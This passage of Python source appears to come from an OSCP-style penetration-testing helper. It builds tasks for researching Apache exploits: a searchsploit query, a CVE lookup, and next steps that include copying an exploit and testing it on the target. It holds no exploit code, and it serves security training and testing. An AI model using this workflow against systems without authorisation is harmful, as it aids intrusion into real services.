                'type': 'parent',
                'children': [
                    {
                        'id': f'apache-searchsploit-{port}',
                        'name': f'SearchSploit: Apache {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "Apache {version}"',
                            'description': 'Search ExploitDB for version-specific Apache exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'Local ExploitDB search tool',
                                f'"Apache {version}"': 'Search term with quotes for exact match'
                            },
                            'success_indicators': [
                                'Exploits found for this version',
                                'RCE or privilege escalation available',
                                'Working PoC exists'
                            ],
                            'next_steps': [
                                'Read exploit: searchsploit -x <EDB-ID>',
                                'Copy to working directory: searchsploit -m <EDB-ID>',
                                'Test on target',
                                'Document attempt in writeup'
                            ],
                            'alternatives': [
                                f'Google: "Apache {version} exploit"',
                                f'GitHub: Search "Apache {version} vulnerability"',
                                'CVE databases: nvd.nist.gov, cve.mitre.org'
                            ]
                        }
                    },
                    {
                        'id': f'apache-cve-lookup-{port}',
                        'name': f'CVE Lookup: Apache {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'crack cve-lookup "Apache httpd {version}"',
                            'description': 'Search CVE databases for known vulnerabilities',
                            'tags': ['RESEARCH', 'OSCP:MEDIUM'],
                            'flag_explanations': {
                                'cve-lookup': 'CRACK Track CVE search command',
                                f'"Apache httpd {version}"': 'Search term (product + version)'
                            },
                            'success_indicators': ['CVEs found with CVSS scores', 'Relevant security bulletins discovered'],
                            'failure_indicators': ['No CVEs for this version', 'Version too new/old'],
                            'next_steps': ['Research CVE details on nvd.nist.gov', 'Search for PoC exploits on GitHub'],
                            'alternatives': ['Google: "CVE Apache httpd {version}"', 'NVD: nvd.nist.gov/vuln/search']
                        }
                    }
                ]
            })

        return tasks
